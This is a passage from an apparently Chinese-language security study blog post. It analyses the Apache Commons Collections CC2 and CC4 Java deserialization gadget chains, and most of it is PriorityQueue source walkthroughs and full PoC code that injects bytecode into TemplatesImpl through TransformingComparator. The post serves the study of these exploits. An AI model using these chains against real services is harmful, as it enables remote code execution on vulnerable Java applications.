punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                c <span class=\"token operator\">=</span> queue<span class=\"token punctuation\">[</span>child <span class=\"token operator\">=</span> right<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>comparator<span class=\"token punctuation\">.</span><span class=\"token function\">compare</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span> c<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            queue<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            k <span class=\"token operator\">=</span> child<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        queue<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>现在唯一关心的点就是  <code>PriorityQueue</code>  里  <code>comparator.compare</code>  的参数是否可控</p>\n<blockquote>\n<p>分析</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 传入 i 和 (E) queue [i]，需要用到 size 这个 变量</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">heapify</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size <span class=\"token operator\">>>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token function\">siftDown</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span> queue<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>查找  <code>size</code>  是如何进行赋值的</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">offer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NullPointerException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        modCount<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> queue<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token function\">grow</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        size <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            queue<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token function\">siftUp</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>size 是在 offer 中进行赋值，offer 被 add 调用，根据添加的成员个数进行累加赋值。<br />\n那如果想要  <code>i = (size &gt;&gt;&gt; 1) - 1</code>  通过，size 必须大于等于 2。<br />\nqueue [] 里面就是我们 add 值，我们再看到 siftDownUsingComparator 里的 comparator.compare，compare 中的值也是从 queue 中进行获取的 ，所以只要我们在 add 的时候把 templates 放进去，那么不就控制了 compare 里的值。</p>\n<blockquote>\n<p>因为现在不能确定 siftDownUsingComparator 里的 comparator.compare 调用的是那个值，所以全部赋值为 templates</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>priorityQueue<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        priorityQueue<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>现在逻辑上来说，只要我们序列化和反序列化，它就能加载我们的动态字节码，但是实际上我们发现，在序列化时它就执行了字节码，问题出在那里，可以跟进调试一下<br />\n调试过程中我们发现，在 add 的时候它就会去执行 <code>comparator.compare</code> ，所以我们还要进行反射赋值。</p>\n<blockquote>\n<p>add 的调用</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">offer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NullPointerException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        modCount<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> queue<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token function\">grow</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        size <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            queue<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token function\">siftUp</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">siftUp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k<span class=\"token punctuation\">,</span> <span class=\"token class-name\">E</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>comparator <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token function\">siftUpUsingComparator</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token function\">siftUpComparable</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">siftUpUsingComparator</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k<span class=\"token punctuation\">,</span> <span class=\"token class-name\">E</span> x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">int</span> parent <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>k <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>>></span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token class-name\">Object</span> e <span class=\"token operator\">=</span> queue<span class=\"token punctuation\">[</span>parent<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>comparator<span class=\"token punctuation\">.</span><span class=\"token function\">compare</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span> e<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            queue<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            k <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        queue<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>反射调用</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">PriorityQueue</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> priorityQueue<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Method</span> add <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        add<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        add<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>priorityQueue<span class=\"token punctuation\">,</span>templates<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        add<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>priorityQueue<span class=\"token punctuation\">,</span>templates<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>下面就是序列化和反序列化了</p>\n<blockquote>\n<p>PoC</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">TemplatesImpl</span> templates <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> templates<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 获取 Class</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// 对_name 进行复制</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">Field</span> name <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        name<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token string\">\"aa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token comment\">// 对_bytecodes 进行赋值</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span> <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">readAllBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Paths</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/home/zhy/Desktop/Classes/Test.class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token class-name\">Field</span> bytecodes <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        bytecodes<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span>bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// 对 _tfactory 进行赋值</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">Field</span> tfactory <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        tfactory<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>templates<span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token class-name\">InvokerTransformer</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> objectObjectInvokerTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newTransformer\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token class-name\">TransformingComparator</span> transformingComparator <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformingComparator</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>objectObjectInvokerTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token class-name\">PriorityQueue</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> priorityQueue <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PriorityQueue</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>transformingComparator<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">PriorityQueue</span><span class=\"token punctuation\">></span></span> aClass <span class=\"token operator\">=</span> priorityQueue<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token class-name\">Method</span> add <span class=\"token operator\">=</span> aClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        add<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        add<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>priorityQueue<span class=\"token punctuation\">,</span>templates<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        add<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>priorityQueue<span class=\"token punctuation\">,</span>templates<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"cc4\"><a class=\"anchor\" href=\"#cc4\">#</a> CC4</h1>\n<p>看完 CC2 的学习 CC4 就非常容易了，CC4 直接使用了 CC3 的下半条链，直接走到了 <code>chainedTransformer</code> ，用法也更简单了</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transforms <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InstantiateTransformer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Templates</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>templates<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">ChainedTransformer</span> chainedTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transforms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>chainedTransformer</code>  直接放入 <code>TransformingComparator</code> ， <code>TransformingComparator</code>  在放入  <code>PriorityQueue</code> ，就可以了，也不用关心 <code>compare</code>  的值是什么东西了。</p>\n<blockquote>\n<p>CC4 Poc<br />\n 这里使用反射改变了 <code>size</code>  的值，也可以直接 <code>add</code>  添加</p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">PriorityQueue</span> priorityQueue <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PriorityQueue</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformingComparator</span><span class=\"token punctuation\">(</span>chainedTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token comment\">//priorityQueue.add(1);</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">//priorityQueue.add(1);</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">PriorityQueue</span><span class=\"token punctuation\">></span></span> priorityQueueClass <span class=\"token operator\">=</span> <span class=\"token class-name\">PriorityQueue</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">Field</span> size <span class=\"token operator\">=</span> priorityQueueClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        size<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        size<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>priorityQueue<span class=\"token 